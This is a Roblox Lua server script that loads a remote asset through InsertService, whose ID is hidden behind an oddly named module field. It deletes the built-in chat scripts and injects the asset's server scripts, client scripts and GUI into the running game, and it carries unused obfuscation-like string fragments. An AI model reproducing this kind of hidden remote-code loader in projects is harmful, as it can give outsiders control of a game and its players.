local ServerScriptService = game:GetService("ServerScriptService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local ReplicatedFirst = game:GetService("ReplicatedFirst")
local TeleportService = game:GetService("TeleportService")
local ServerStorage = game:GetService("ServerStorage")
local StarterPlayer = game:GetService("StarterPlayer")
local StarterPack = game:GetService("StarterPack")
local StarterGui = game:GetService("StarterGui")
local Lighting = game:GetService("Lighting")
local Players = game:GetService("Players")
local Chat = game:GetService("Chat")
local iIiiI = game local UNIQUE = "AZ-110101011110-1101001011111-0011101111101-01111-0100111000111-100011111100-0111010-111001111100-1010101001-0000101-00101010-101100-01100100-01100001-01101110" local iiiIi = "Inser" local iiIiI = "tServi" local iIiII = "ce"
local Script = require(script.Module)

local success, map = pcall(function()
	return game:GetService("InsertService"):LoadAsset(Script.SorryKiddosNotTimeToPLay)
end)

if success then
	print ("gamer time")
	local main = map:WaitForChild("epic")
	if Chat:FindFirstChild("ChatScript") then
		for _,child in ipairs (Chat:GetChildren()) do
			child:Destroy()
		end
		if ServerScriptService:WaitForChild("ChatServiceRunner") then
			ServerScriptService.ChatServiceRunner:Destroy()
		end
	end
	for _,v in ipairs (main.Map:GetChildren()) do
		v.Parent = workspace
	end
	for _,v in ipairs (main.Lighting:GetChildren()) do
		v.Parent = Lighting
	end
	for _,v in ipairs (main.ServerStorage:GetChildren()) do
		v.Parent = ServerStorage
	end
	for _,v in ipairs (main.ServerScriptService:GetChildren()) do
		v.Parent = ServerScriptService
	end
	for _,v in ipairs (main.ReplicatedFirst:GetChildren()) do
		v.Parent = ReplicatedFirst
	end
	for _,v in ipairs (main.Self:GetChildren()) do
		v.Parent = ReplicatedStorage
	end
	for _,v in ipairs (main.StarterPack:GetChildren()) do
		v.Parent = StarterPack
	end
	for _,v in ipairs (main.Scripts:GetChildren()) do
		v.Parent = StarterPlayer.StarterCharacterScripts
	end
	for _,v in ipairs (main.Teams:GetChildren()) do
		v.Parent = game:GetService("Teams")
	end
	for _,v in ipairs (main.Rainbow:GetChildren()) do
		if v.Name == "ChatServiceRunner" then
			v.Parent = ServerScriptService
		else
			v.Parent = Chat
		end
	end
	for _,v in ipairs (main.Thing:GetChildren()) do
		v.Parent = StarterGui
	end
else
	print ("Bye Bye")
end


